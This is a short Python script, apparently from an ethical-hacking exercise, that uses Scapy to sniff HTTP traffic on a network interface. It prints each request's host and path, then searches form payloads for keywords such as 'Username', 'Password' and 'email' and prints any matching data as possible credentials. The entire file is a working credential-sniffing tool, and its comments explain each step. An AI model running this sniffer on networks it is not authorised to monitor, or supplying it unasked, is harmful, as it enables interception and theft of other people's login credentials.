
print('***NETWORK PACKET SNIFFER***')
# Importing necessary libraries
import scapy.all as scapy  # Used for packet sniffing and manipulation
import argparse  # Used for handling command-line arguments
from scapy.layers import http  # Provides support for HTTP packet parsing


# Function to get the network interface from the user via command-line arguments
def get_interface():
    # Create a parser object for command-line arguments
    parser = argparse.ArgumentParser()

    # Add an argument for specifying the network interface
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface to capture packets")

    # Parse the arguments provided by the user
    arguments = parser.parse_args()

    # Return the interface specified by the user
    return arguments.interface


# Function to start sniffing packets on the specified network interface
def sniff(iface):
    # Use Scapy's sniff() function to capture packets
    # Parameters:
    # - iface: Specifies the network interface to sniff on
    # - store=False: Prevents storing packets in memory to reduce overhead
    # - prn=process_packet: Calls the `process_packet` function for each captured packet
    scapy.sniff(iface=iface, store=False, prn=process_packet)


# Function to process captured packets
def process_packet(packet):
    # Check if the packet contains an HTTP request
    if packet.haslayer(http.HTTPRequest):
        # Extract and print the HTTP host and requested path
        print("[+] HTTP Request >> " + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode())

        # Check if the packet has a raw layer (contains unstructured data like form inputs)
        if packet.haslayer(scapy.Raw):
            # Extract the raw data (payload) from the packet
            load = packet[scapy.Raw].load.decode(errors="ignore")

            # Define a list of keywords to search for in the payload (e.g., login credentials)
            keys = ["Username", "Password", "pass", "email"]

            # Search for any keyword in the payload
            for key in keys:
                if key in load:
                    # Print possible sensitive information if a keyword is found
                    print("[+] Possible password/username >> " + load)
                    break  # Stop searching once a match is found


# Get the network interface from the user
iface = get_interface()

# Start sniffing on the specified interface
sniff(iface)
